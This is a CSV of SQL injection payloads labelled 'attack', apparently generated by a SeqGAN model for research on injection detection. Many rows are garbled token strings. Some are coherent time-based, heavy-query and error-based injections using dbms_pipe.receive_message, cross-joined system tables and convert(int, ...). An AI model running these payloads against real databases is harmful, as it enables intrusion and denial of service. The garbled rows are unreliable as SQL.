label,payload,family,payload_type,method,run_id,sample_index
attack,1'   )   as and q7417  (    i    (  (  select  (  8288pqp 3352  (  =  =  1087 xp_us as t3ustaperercount    (  7522 or 9660  =  (  ilef(  =  herexpp_us and 3038pex  =  6671  =  repepcous t3  =  char  (  =  *s 7793  *  =  2961  =  (  3484rindpain ap_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,86
attack,"%'  ,sbrptclefi$fell_usibmnalerinbt1es as ablu""  =  ""lrvefzl_ibsinbintjt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,87
attack,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,88
attack,"1""   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,89
attack,"-4873'  )   'cgou'and t  =  _usttant  =  comalall_us as t1,aomain.t4ibm.fntztchar  (  121  113  '||  (  select 'inras cym.s as atrib8518bc,estriomefin.sesdll_usailngh*  (  =  =  =    8518#",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,90
attack,"1'   )     )   3880 3580 and and dominmj where when 3393  (  =  6388  (  =  =  select =  =  (  rt  =  t  =  ,1  ( and 2027hcL 1087  =  =  3352 char  =  =  =    85  =  (  =  (  r  =  =  =  3393  =    (  =  1441  =  =    ( and    = c(  (  (  riblexpacl_t_l_kdbmdbledpeapp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,91
attack,"1   )   and 2642  (  (  fqpzint  (  riomperrdbgryppsershril_ domaolabltdbl_t11mug',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,92
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'rj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,93
attack,1%%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,94
attack,1 where =  6503 2774  =  gexp  =  co   char *  =       3038  if 8571  (  111  =  =    (  =     (  =        le7555  (  select 9198  =  =  =  =  =  4018 from or t  =  =  L  (  char and or a  =    (  =u  =  =  2027 3352(  =  =  2027  100  select   =  il_uns rins attat  (     )  =  6503      =  =  *  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,95
attack,"1"" orN=     =    char  =  =  =  =    charchar  113  119  (  *  =  =  =  select t  =  =  0x7171706a71ct  =  =  *  (  =  =  113     )    )  riountapex  =  =  =  =    )  l1alt_uss as as atcstrgdount  (  6388 8691  (  2961ep  =  =  =  2961  =  7522  =  1048",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,96
attack,1where    =    (  =  rtaq  =  =    =     (  )  3862  =  =  =  =    =  =  112  (   from gexprs(  deribstrib$t  = char  =  =   6671  3862  =  +char  (  (  =  $(echt_upp_s t1rs typtdol_uabstatcgeg* 9643  =  (  48  (  =  = 5485 char  )  c tthen /*  =  =  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,97
attack,"1'||  (  select 'v z2180zntcobwzy""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,98
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kk",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,99
attack,1'+  (  select 't1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,100
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,101
attack,"-4462%99i%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  'a",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,102
attack,"1'||  (  select 'b$skpbgg' 5286  (  =  (  113  =  (  =  79  (  =p_up_,ab$as t  =  3352 coumain.dins t2,v  =  2961  (  ""dskh""  ( where where  (  ripeft_upas co)upstt  =    =  =  =    =  122  2961  =  or _   =  =  =  =    =  (  7522 csers t4tchar  (  8571""   select 9643",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,103
attack,1   )     m2   )    ab  (  1087  =  (er  (  =  1441yp_t  (  (  4018 char  =  3352 6093  =e_ _uint  (  5485  (  char  =  (  (  48  =  =  7793 4799  =  (  6093a 6388  +  (  7522  6671  =  (  convertt(  =  (  *  (  =  (  il_us alll_)  as t5  =  rdont_,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,104
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,105
attack,-9462%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,106
attack,"1""  =  ""  )     )    2724  ak    = 2774 in 3880  (  =  =  7522 char 'cgou'ex 7555iont  (  =  =  =1    =    =  rt  (  =  107  =  =     )  =  6388  (  rex  (  =  3455 or char  =  5485ggexp_in.taejpep  =  s when or char  =  =  6849ubt_ 2642  ( 9643  =  (  (  =  from tavih,q_kem",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,107
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,108
attack,"15%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,109
attack,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,110
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%""  =  ""z",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,111
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,112
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,113
attack,"1""    79  3393 or char  (  (  6503 or where*  =  =  (  =   (  48  (  =  =  =  (  rex 2649 1668  =  (  =  =  =  4799 when concat  =  2724 2367  =  =  (  5485  =  (  (  =  3880 2961  (    (  3455  =  =    (   char  =  =  65  =  (p_s assemj and where 5556  =  8571hegexp_ul_4018a,rdbll_uma,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,114
attack,"1""   )   where 9660 6849  ly  =  ft_uxe)  (  2961char  rib$co,uluibl_kepqcomablilecon.t  (  =  =  =/  c a/cs t1,riomakdooma.tsysdomatin4906unt 2180 t3  (  *  (  =  =  (  4018 7555    4799 concat  =  113t_=    acimtsas t3  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,115
attack,"1""   )   where when and 8446744073709551610   or  (  =  3393  =  (  (    (  =  =    =  (  6388  =  =  =  7793 5485  =  =  *  (  *g ableinstrib  yp_upel_us   aibll_kasts at regup  =  =  100  (  65  (  )  =  =  6503 char  (  6671  (  *  (  =     r  (  =  =  (  88  =  3862  ( char  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,116
attack,"1""  and   then and couyszmntthenimainerdo  as ans t2,apeaml_insibrsts t2,teex  (  6671   (  *    (  =  l_ibnthtausercoyg)  )   from t3  )  3880  =  =  =   (  =  (  (  2961    =    =  (  =  =  (   = or like 9660  a=  =    =  =  =  )  =  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,117
attack,1   3038,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,118
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,119
attack,"%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '105   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,120
attack,"1%%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'gl  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,121
attack,1'||  (  select 'nzhrzinw%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,122
attack,"1%%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ''    =   where 6179  (  )  =    (  selectt  (  char  (  * (  *zcan  =  =  =  2961 char  (    (  3393 4799 and 2649  122  =  eppt_ung'  6671  =  2774 or ae2774 c(  (     )  =  b  =  and 4018  (  =  =  =  =  =  (  5485  s ing(    ah as 3352  =  (  112  =  rep_bp_ku_seas ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,123
attack,"1'+  (  select '""  )   or   (  ""0  select coumnp_in.tib5  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,124
attack,"1' char  65  (  (  6503  (  'cgou' 5286   (  (  0x7171706a71,qex  =  L  =  =  77  and  =  7555 6093 where 6093 7555 or 7793 or   (  =  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,125
attack,15000000000)   abrdpt where charex  * 7793  =  7793(  7793  =  (  =x,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,126
attack,1%'   )    aNub$(  (  1087  (  rupt_t  =  and or 3393   )  ( _ when 2649  =  6849  2027 6388   end char  (  (  or asers aint  (  =  =  6388 2367  =  =  oes a(  )  s ciommasdbn.ttdblefg t  ie2027 1087  (  r_kupdbl_in' where 4912  =  4912 or 6979  =  like  (  's as as t3  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,127
attack,1   113  )    'unusual',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,128
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%' or 8384  =  like  (  'a,""  =  ""s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,129
attack,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,130
attack,1   )    )   ||clqandpptie_s where t23393  (  69  6849 t3113char  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,131
attack,"1     %ab"" like ""subm.g",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,132
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,133
attack,"1   )    where 6849 coumabtin.t_ublesint  9643  1087 ah  (  ) _    )  ,x  =  =  =  (  =  (  =  incb_s 8446744073709551610,dblpecaibaintr'  =  'rt  (  =  (  =  ryperex_upiombobm.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,134
attack,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwdmzrj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,135
attack,"1%""  =  ""'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,136
attack,"1""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,137
attack,"1%""  =  ""E,psdir",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,138
attack,1'+  (  select 'awly,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,139
attack,"1'   where cabl""  =  ""  =  2642  (  char  =   6671  =  (  select char  =  =p  =  =  =  =  2961 3880 pconcat  =  =  2961 (  3455  65  (  =  (  =  =  c3393 5485 7522      =  where   _up_k,dimas t2ibm.stas t3  =   =   3880 _=    =  =  (  6093 (  =  (  4018  =  6849  =  ( rert_up  = or 2774 and   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,140
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  """" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ng",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,141
attack,"1"" where 9643     =  *  =  3393  or 1087  (  7793  =  =exp_blep_s adlom.bleaolupep1isygs and and    =     )   )    yp  (  (  =  =  intpca 3038  =  65 x or _=  =  =     )  )     --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,142
attack,"1""  alalll_ubs",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,143
attack,1'||  (  select 'ngepppereftecatzount  =  (  =  =   2642 t  =  2027(  4018  6849  =  (   6093  =  *p_sipefrernsioumtdbm.mab,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V2__sql_aware__len160__gpre120__reward_off__seed88,144
